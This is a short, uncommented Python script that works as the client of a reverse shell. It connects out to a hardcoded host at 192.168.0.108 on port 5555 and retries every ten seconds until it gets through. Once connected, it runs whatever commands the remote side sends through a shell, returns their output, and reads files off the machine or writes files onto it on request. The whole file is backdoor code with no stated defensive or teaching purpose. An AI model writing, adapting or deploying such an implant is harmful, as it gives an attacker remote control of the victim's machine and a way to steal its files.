import socket
import time
import json
import subprocess
import os




IP4 = "192.168.0.108"









def reliable_send(data):
    jsondata = json.dumps(data)
    S.send(jsondata.encode())


def reliable_rcv():
    data = ""
    while True:
        try:
            data = data + S.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError():
            continue


def upload_file(fName):
    f = open(fName, 'rb')
    S.send(f.read())


def download_file(fName):
    f = open(fName, 'wb')
    S.settimeout(1)
    chunk = S.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = S.recv(1024)
        except socket.timeout as e:
            break
    S.settimeout(None)
    f.close()


def connection():
    while True:
        time.sleep(10)
        try:
            S.connect((IP4,5555))
            shell()
            S.close()
            break

        except:
            connection()

def shell():
    while True:
        command = reliable_rcv()
        if command == 'quit':
            break
        elif command=='clear':
            pass
        elif command[:3]=='cd ':
            os.chdir(command[3:])
        elif command[:8]=='download':
            upload_file(command[9:])
        elif command[:6]=='upload':
            download_file(command[7:])
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)



S = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()


